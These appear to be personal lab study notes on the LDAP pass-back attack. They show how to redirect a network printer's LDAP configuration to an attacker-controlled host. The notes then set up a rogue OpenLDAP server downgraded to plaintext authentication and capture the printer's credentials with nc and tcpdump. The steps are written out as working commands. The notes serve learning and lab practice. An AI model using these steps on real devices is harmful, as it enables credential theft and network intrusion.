#cybersecurity 

Lightweight Directory Access Protocol.
Authentication similar to [[NTLM]]
Here the application directly verifies the user's credential.

Popular mechanism:

- Gitlab
- Jenkins
- Custom-developed web applications
- Printers
- VPNs

![[Pasted image 20240902103729.png]]

### LDAP Pass-back Attacks
Common attack against network devices, such as printers.
It can be performed when we gain access to a device's configuration where the LDAP parameters are specified. They usually are default.
We can alter the LDAP configuration , such as the IP or hostname of the LDAP server.
In the Pass-back attack, we can modify this IP to our IP and then test the LDAP configuration.


### Performing LDAP Pass-back
Network Printer
![[Pasted image 20240902104651.png]]

We have the username, but not the password
We can see that an authentication request is made to the domain controller to test the LDAP credentials
Let's try to exploit this to get the printer to connect to us instead.

```bash
nc -lvp 389 #default LDAP port
listening on [any] 389 ... 10.10.10.201: inverse host lookup failed: Unknown host connect to [10.10.10.55] from (UNKNOWN) [10.10.10.201] 49765 0?DC?; ? ?x objectclass0?supportedCapabilities
```

The `supportedCapabilities` response tells us we have a problem. Essentially, before the printer sends over the credentials, it is trying to negotiate the LDAP authentication method details
It will use this negotiation to select the most secure authentication method that both the printer and the LDAP server support. If the authentication method is too secure, the credentials will not be transmitted in cleartext.
We need to create a rogue LDAP server.

### Hosting a Rogue LDAP Server
We will use OpenLDAP
```bash
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
```

Now we configure our own LDAP
```bash
sudo dpkg-reconfigure -p low slapd
```

![[Pasted image 20240902113357.png]]

![[Pasted image 20240902113401.png]]

![[Pasted image 20240902113405.png]]

![[Pasted image 20240902113413.png]]

![[Pasted image 20240902113419.png]]

![[Pasted image 20240902113423.png]]

![[Pasted image 20240902113427.png]]


We need to make it vulnerable by downgrading the supported authentication mechanisms, we want to ensure that our LDAP only supports PLAIN and LOGIN authentication methods.
To do this we create a new ldif file with this content
```
#olcSaslSecProps.ldif 
dn: cn=config 
replace: olcSaslSecProps 
olcSaslSecProps: noanonymous,minssf=0,passcred
```

- **olcSaslSecProps:** Specifies the SASL security properties
- **noanonymous:** Disables mechanisms that support anonymous login
- **minssf:** Specifies the minimum acceptable security strength with 0, meaning no protection.

```bash
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```

### Capturing LDAP credentials
Now we can click Test settings with our IP

If we receive the error "This distinguished name contains invalid syntax" we can take the credentials with this command

```bash
sudo tcpdump -SX -i breachad tcp port 389
```